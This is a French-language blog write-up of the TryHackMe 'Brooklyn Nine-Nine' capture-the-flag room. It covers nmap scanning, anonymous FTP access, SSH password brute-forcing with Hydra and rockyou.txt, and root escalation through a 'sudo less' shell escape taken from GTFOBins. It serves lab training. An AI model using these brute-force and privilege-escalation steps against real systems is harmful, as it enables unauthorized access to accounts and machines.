---
title: "Write-up : TryHackMe - Brooklyn Nine-Nine"
date: 2025-04-22T09:00:00+02:00 # Met l'heure à 9h du matin, bien avant 23h50
draft: false                     # <--- TRÈS IMPORTANT : 'false' pour publier
author: "AntoineWHR"             # <--- Ton nom/pseudo (optionnel, si défini globalement)
tags: ["TryHackMe", "CTF", "Linux", "FTP", "SSH", "Sudo", "Less"] # <--- Des tags pertinents
categories: ["WriteUps"]         # <--- Une catégorie (ex: WriteUps)
comment:
  enable: true
description: "Solution pas à pas du challenge TryHackMe Brooklyn Nine-Nine, de la reconnaissance à l'accès root." # <--- Description courte
---

<!--more--> 

# **Write-up : TryHackMe - Brooklyn Nine-Nine**

## **Informations sur la Room**

*   **Nom :** Brooklyn Nine-Nine
*   **Plateforme :** TryHackMe
*   **Lien :** [https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine) 
*   **Difficulté Annoncée :** Facile (Easy)
*   **Objectif :** Obtenir les flags `user.txt` et `root.txt`.

## **Introduction**

Ce challenge nous plonge dans l'univers de la série Brooklyn 99. Notre mission est de compromettre le serveur utilisé par l'équipe et de récupérer les flags utilisateur et root, en exploitant probablement quelques faiblesses laissées par nos personnages préférés.

## **Phase 1 : Reconnaissance & Énumération**

### **1. Scan des Ports (Nmap)**

Comme toujours, commençons par un scan Nmap pour identifier les services exposés sur la machine cible.

```bash
# -sC: Utilise les scripts Nmap par défaut
# -sV: Tente de déterminer la version des services
```

![Résultats Nmap](../static/images/nmap1.png)

Le scan révèle trois ports ouverts principaux :

*   **Port 21 (FTP) :** vsftpd - Permet la connexion anonyme (`Anonymous FTP login allowed`).
*   **Port 22 (SSH) :** OpenSSH 
*   **Port 80 (HTTP) :** Apache 

### **2. Exploration FTP**

La possibilité de connexion anonyme sur le FTP est une piste intéressante. Connectons-nous :

```bash
ftp -p <IP_SERVEUR> <PORT>
# Nom : Anonymous
# Mot de passe : 
```

Une fois connecté, on liste les fichiers et on trouve la note : `note_to_jake.txt`. Téléchargeons-la (`get note_to_jake.txt`) et examinons son contenu (`cat note_to_jake.txt`).

![Note FTP](static/images/ftp2.png)

La note mentionne que Jake a un mot de passe très faible. (ça lui ressemble bien) 
C'est une information cruciale pour la suite !

### **3. Exploration Web (HTTP)**

Avant de tenter le brute-force, jetons un œil au serveur web sur le port 80. La page d'accueil par défaut d'Apache ne révèle rien d'immédiat. Utilisons `feroxbuster` (ou `gobuster`/`dirb`) pour chercher des répertoires ou fichiers cachés.

```bash
# -w : Spécifie la wordlist
# -u : L'URL cible
feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP_SERVEUR>/
```

Malgré l'énumération web, aucun répertoire ou fichier intéressant n'a été découvert lors de cette étape.

## **Phase 2 : Exploitation - Accès Initial (User Flag)**

### **Brute-force SSH avec Hydra**

Forts de l'indice trouvé dans la note FTP ("mot de passe très simple" pour l'utilisateur "jake"), nous allons tenter une attaque par brute-force sur le service SSH (port 22) en utilisant Hydra. Nous utiliserons `rockyou.txt`, une wordlist très commune, en espérant y trouver le mot de passe faible.

```bash
# -l jake : Spécifie le nom d'utilisateur cible
# -P /usr/share/wordlists/rockyou.txt : Spécifie le fichier de mots de passe
# ssh://<IP_SERVEUR>/ : Spécifie le service et l'hôte cible
# -f : Arrête Hydra dès qu'un mot de passe valide est trouvé
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP_SERVEUR>/ -f 
```

![](/images/hydra3.png)

Succès ! Hydra trouve rapidement le mot de passe : `987654321`.

### **Connexion SSH et Flag Utilisateur**

Connectons-nous maintenant en SSH avec les identifiants trouvés :

```bash
ssh jake@<IP_SERVEUR>
# Entrer le mot de passe : 987654321
```

Une fois connecté, nous cherchons le flag utilisateur (`user.txt`). Après un peu d'exploration (ou en suivant les conventions habituelles), on le trouve dans le répertoire `/home/holt`. Clin d'œil amusant à la série !

```bash
ls /home/holt/
cat /home/holt/user.txt
```

![Flag User](static/images/ssh4.png)


**Flag Utilisateur Obtenu !**

---

## **Phase 3 : Élévation de Privilèges (Root Flag)**

### **Vérification des Privilèges Sudo**

Maintenant que nous avons un accès en tant que `jake`, cherchons comment devenir `root`. Une des premières commandes à vérifier est `sudo -l`, qui liste les commandes que l'utilisateur actuel peut exécuter avec `sudo`.

```bash
sudo -l
```


La sortie indique que l'utilisateur `jake` peut exécuter la commande `/usr/bin/less` en tant que `root` sans mot de passe (`NOPASSWD`).

```
User jake may run the following commands on :
    (ALL : ALL) NOPASSWD: /usr/bin/less
```

### **Exploitation via `less` (GTFOBins)**

Certains binaires Linux, même ceux qui semblent inoffensifs comme `less` (un paginateur de texte), peuvent être détournés pour obtenir un shell s'ils sont exécutés avec des privilèges élevés. Le site [GTFOBins](https://gtfobins.github.io/) est une ressource fantastique pour trouver de telles techniques.

En cherchant `less` sur GTFOBins, nous trouvons une section "Sudo".


La technique est simple :
1.  Exécuter `less` via `sudo` sur n'importe quel fichier (par exemple `/etc/profile`).
2.  Une fois dans l'interface de `less`, taper `!/bin/sh` (ou `!/bin/bash`). Le `!` permet d'exécuter une commande shell depuis `less`.

Appliquons cela :

```bash
sudo less /etc/profile
```

Une fois que `less` affiche le contenu du fichier, tapez :

```
!/bin/sh
```

Appuyez sur Entrée.

### **Accès Root et Flag Root**

Nous sommes maintenant `root`. Il ne reste plus qu'à récupérer le flag final, généralement situé dans `/root/root.txt`.

```bash
# cd /root
# ls
root.txt
# cat root.txt
```

![GTFOBins - less](static/images/root5.png) 

**Flag Root Obtenu ! Challenge Terminé !**

## **Conclusion**

Ce challenge "Brooklyn Nine-Nine" était une excellente introduction aux concepts de base du CTF :

1.  **Énumération :** Scan de ports (Nmap), découverte de services (FTP anonyme, SSH, HTTP), énumération web (feroxbuster).
2.  **Exploitation :** Utilisation d'indices (note FTP) pour cibler une attaque (brute-force SSH avec Hydra).
3.  **Élévation de Privilèges :** Vérification des permissions `sudo` (`sudo -l`) et exploitation d'une mauvaise configuration via un binaire autorisé (exploitation de `less` via GTFOBins).

C'était une room amusante et bien thématisée, parfaite pour les débutants.

PS : Jake change de mdp stp
